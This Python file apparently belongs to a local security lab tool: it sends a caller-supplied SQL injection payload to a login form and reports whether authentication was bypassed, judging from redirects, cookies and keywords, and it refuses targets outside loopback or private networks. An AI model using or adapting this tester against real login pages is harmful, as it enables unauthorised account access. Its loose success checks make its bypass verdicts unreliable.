import requests
import time
import datetime
import socket
import ipaddress
import os
from urllib.parse import urlparse

def run_attack(target_url: str, payload: str) -> str:
    """
    Executes a real HTTP-based SQL injection tautology check against a local/private target URL.
    This validator determines vulnerability status based on actual server responses.
    """
    logs = []
    
    logs.append("[SYSTEM] Starting remote classic SQL injection scan")
    logs.append(f"[TARGET] {target_url}")
    logs.append(f"[TIME] Scan initiated at {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    logs.append("-" * 90)
    
    # 1. Parse URL
    try:
        parsed_url = urlparse(target_url)
        scheme = parsed_url.scheme
        if not scheme:
            # Try parsing with http:// scheme if scheme is missing
            temp_url = target_url
            if not temp_url.startswith("http"):
                temp_url = "http://" + temp_url
            parsed_url = urlparse(temp_url)
            scheme = parsed_url.scheme or "http"
            
        hostname = parsed_url.hostname
        if not hostname:
            raise ValueError("Hostname could not be parsed.")
            
        port = parsed_url.port
        if not port:
            port = 443 if scheme == "https" else 80
            
        path = parsed_url.path or "/"
        query = parsed_url.query
    except Exception as e:
        logs.append("[ERROR] Invalid URL format.")
        logs.append("[RESULT] FAILED")
        logs.append("[SYSTEM] Scan terminated.")
        return "\n".join(logs)
        
    # 2. Docker check & translation
    in_docker = os.path.exists('/.dockerenv') or (os.path.exists('/proc/self/cgroup') and any('docker' in line for line in open('/proc/self/cgroup', 'rt', errors='ignore')))
    
    actual_hostname = hostname
    if in_docker and hostname in ['localhost', '127.0.0.1', '::1']:
        actual_hostname = 'host.docker.internal'
        
    # 3. DNS Resolution
    logs.append(f"[DNS] Resolving hostname '{hostname}'...")
    time.sleep(0.4)
    
    resolved_ip = None
    try:
        resolved_ip = socket.gethostbyname(actual_hostname)
        logs.append(f"[DNS] Resolved hostname to server IP: {resolved_ip}")
    except socket.gaierror as e:
        logs.append(f"[ERROR] DNS resolution failed for hostname '{hostname}': {str(e)}")
        logs.append("[RESULT] FAILED")
        logs.append("[SYSTEM] Scan terminated.")
        
        # Summary for DNS Failure
        logs.append("\n" + "=" * 90)
        logs.append("CLASSIC SQL INJECTION SUMMARY")
        logs.append("=" * 90)
        logs.append("Target reachable          : No")
        logs.append("HTTP request completed    : No")
        logs.append("Payloads tested           : 0")
        logs.append("Successful injections     : 0")
        logs.append("Success rate              : 0%")
        logs.append("")
        logs.append("Authentication bypassed   : No")
        logs.append("=" * 90)
        return "\n".join(logs)
        
    # 4. Local-lab safety check
    is_safe = False
    if actual_hostname == 'host.docker.internal':
        is_safe = True
    else:
        try:
            ip_obj = ipaddress.ip_address(resolved_ip)
            if ip_obj.is_loopback or ip_obj.is_private:
                is_safe = True
        except ValueError:
            pass
            
    if not is_safe:
        logs.append("[ERROR] Target IP address is not on a local or private network.")
        logs.append("[ERROR] Scanning of public internet targets is disabled for safety.")
        logs.append("[RESULT] FAILED")
        logs.append("[SYSTEM] Scan terminated.")
        
        # Summary for Public Target Blocked
        logs.append("\n" + "=" * 90)
        logs.append("CLASSIC SQL INJECTION SUMMARY")
        logs.append("=" * 90)
        logs.append("Target reachable          : No")
        logs.append("HTTP request completed    : No")
        logs.append("Payloads tested           : 0")
        logs.append("Successful injections     : 0")
        logs.append("Success rate              : 0%")
        logs.append("")
        logs.append("Authentication bypassed   : No")
        logs.append("=" * 90)
        return "\n".join(logs)
        
    # 5. TCP Connection check
    logs.append(f"[CONNECT] Initializing TCP connection with {hostname}:{port}...")
    time.sleep(0.4)
    
    connected = False
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3.0)
        s.connect((resolved_ip, port))
        s.close()
        connected = True
        logs.append("[CONNECT] Connection successfully established.")
    except Exception as e:
        logs.append("[CONNECT] Connection failed.")
        logs.append(f"[ERROR] Connection failed to {hostname}:{port}: {str(e)}")
        logs.append("[RESULT] FAILED")
        logs.append("[SYSTEM] Scan terminated.")
        
        # Summary for Connection Failure
        logs.append("\n" + "=" * 90)
        logs.append("CLASSIC SQL INJECTION SUMMARY")
        logs.append("=" * 90)
        logs.append("Target reachable          : No")
        logs.append("HTTP request completed    : No")
        logs.append("Payloads tested           : 0")
        logs.append("Successful injections     : 0")
        logs.append("Success rate              : 0%")
        logs.append("")
        logs.append("Authentication bypassed   : No")
        logs.append("=" * 90)
        return "\n".join(logs)
        
    # 6. Perform Real HTTP POST Request
    logs.append("-" * 90)
    logs.append("[PAYLOAD] Preparing classic SQL injection tautology string...")
    logs.append(f"[PAYLOAD] Testing: {payload}")
    time.sleep(0.4)
    
    logs.append("[HTTP] Dispatched POST request:")
    logs.append(f"POST {target_url}")
    
    # Construct the actual target URL to request
    actual_url = f"{scheme}://{actual_hostname}:{port}{path}"
    if query:
        actual_url += f"?{query}"
        
    session = requests.Session()
    data = {
        "email": payload,
        "username": payload,  # Send both to match standard login structures
        "password": "test"
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "X-SPA-Request": "true"
    }
    
    is_success = False
    start_time = time.time()
    try:
        # Perform request with 5s timeout and follow redirects
        response = session.post(actual_url, data=data, headers=headers, timeout=5.0, allow_redirects=True)
        elapsed_ms = int((time.time() - start_time) * 1000)
        
        status_code = response.status_code
        final_url = response.url
        
        # Format final URL for display (revert translation host back to original host if mapped)
        final_url_display = final_url
        if in_docker and 'host.docker.internal' in final_url:
            final_url_display = final_url.replace('host.docker.internal', hostname)
            
        redirected = len(response.history) > 0
        cookies_received = len(session.cookies) > 0
        response_length = len(response.content)
        
        logs.append(f"[HTTP] Status {status_code} returned in {elapsed_ms} ms.")
        logs.append(f"[HTTP] Final URL:\n{final_url_display}")
        logs.append(f"[HTTP] Redirect detected: {'Yes' if redirected else 'No'}")
        logs.append(f"[HTTP] Session cookie received: {'Yes' if cookies_received else 'No'}")
        
        size_kb = response_length / 1024.0
        logs.append(f"[RESPONSE] Response body length: {size_kb:.1f} kB")
        
        # Analyze response to detect SQL injection auth bypass
        response_text_lower = response.text.lower()
        orig_path = parsed_url.path or "/"
        final_parsed = urlparse(final_url)
        final_path = final_parsed.path or "/"
        
        # Heuristic checks
        redirected_away = False
        if "login" in orig_path.lower() or "signin" in orig_path.lower():
            if "login" not in final_path.lower() and "signin" not in final_path.lower():
                redirected_away = True
                
        auth_paths = ["dashboard", "admin", "profile", "home", "account", "welcome", "products", "details", "find"]
        path_indicates_auth = any(p in final_path.lower() for p in auth_paths)
        
        success_keywords = ["logout", "dashboard", "admin", "my account", "login successful", "welcome", "logged in", "user profile"]
        failure_keywords = ["invalid credentials", "invalid email", "login failed", "incorrect password", "authentication failed", "wrong password"]
        
        has_success_keyword = any(kw in response_text_lower for kw in success_keywords)
        has_failure_keyword = any(kw in response_text_lower for kw in failure_keywords)
        
        success_reason = ""
        if status_code >= 400:
            is_success = False
            success_reason = f"Server returned error status code: {status_code}."
        else:
            if redirected_away or path_indicates_auth:
                is_success = True
                success_reason = "Redirect away from login page to authenticated area detected."
            elif cookies_received and not has_failure_keyword:
                is_success = True
                success_reason = "Session cookie received without failure indicators."
            elif has_success_keyword and not has_failure_keyword:
                is_success = True
                success_reason = "Authentication indicators were detected."
            else:
                is_success = False
                success_reason = "No authentication bypass indicators detected."
                
        if is_success:
            logs.append(f"[ANALYSIS] {success_reason}")
            logs.append("[RESULT] SUCCESS!")
            logs.append("Classic SQL Injection bypassed authentication.")
        else:
            logs.append(f"[ANALYSIS] {success_reason}")
            logs.append("[RESULT] FAILED")
            
    except requests.exceptions.Timeout:
        logs.append("[ERROR] Request timed out (5s).")
        logs.append("[RESULT] FAILED")
    except requests.exceptions.SSLError as e:
        logs.append(f"[ERROR] SSL Error: {str(e)}")
        logs.append("[RESULT] FAILED")
    except requests.exceptions.RequestException as e:
        logs.append(f"[ERROR] HTTP request failed: {str(e)}")
        logs.append("[RESULT] FAILED")
        
    # Summary
    logs.append("-" * 85)
    logs.append("\n[SYSTEM] Classic SQL injection scan completed.")
    logs.append("=" * 90)
    logs.append("CLASSIC SQL INJECTION SUMMARY")
    logs.append("=" * 90)
    logs.append("Target reachable          : Yes")
    logs.append(f"HTTP request completed    : {'Yes' if 'status_code' in locals() else 'No'}")
    logs.append(f"Payloads tested           : 1")
    logs.append(f"Successful injections     : {1 if is_success else 0}")
    logs.append(f"Success rate              : {'100%' if is_success else '0%'}")
    logs.append("")
    final_path_display = urlparse(final_url).path if 'final_url' in locals() else "/"
    logs.append(f"Final URL                 : {final_path_display}")
    logs.append("")
    logs.append(f"Authentication bypassed   : {'Yes' if is_success else 'No'}")
    logs.append("=" * 90)
    
    return "\n".join(logs)